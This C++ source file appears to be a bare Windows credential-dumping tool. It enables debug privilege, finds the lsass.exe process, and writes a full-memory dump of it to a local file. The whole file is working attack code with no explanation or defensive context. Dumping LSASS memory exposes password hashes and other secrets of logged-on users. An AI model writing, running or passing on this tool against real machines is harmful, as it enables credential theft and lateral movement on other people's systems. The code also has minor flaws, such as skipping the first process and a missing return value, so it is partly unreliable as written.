#include <cstdio>
#include <windows.h>
#include <winternl.h>
#include <DbgHelp.h>
#include <tlhelp32.h>
#include <processsnapshot.h>

void EnableDebugPriv()
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkp;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL);

    CloseHandle(hToken); 
}

DWORD getPID() {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    DWORD procid;
   
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (lstrcmp(entry.szExeFile,L"lsass.exe") == 0)
            {
                procid = entry.th32ProcessID;


            }
        }
    }
    return procid;
}



bool dump(DWORD id) {
    
    DWORD procid = id;
    HANDLE myfile = CreateFile(L"myfile.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procid);

  

    printf("%d", processHandle);
    if (processHandle == nullptr) {

        printf("error while getting handle");
    }
    if (MiniDumpWriteDump(processHandle, procid, myfile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
        printf("ok");
    }
    else {
        return false;
    }
    
}

int main( int, char *[] ){
    EnableDebugPriv();
    DWORD id = getPID();
    printf("%d", id);

    if (dump(id)) {

        printf("great dumped !");
    }
    else {

        DWORD error = GetLastError();
        printf("%d", error);
    }

   
       

}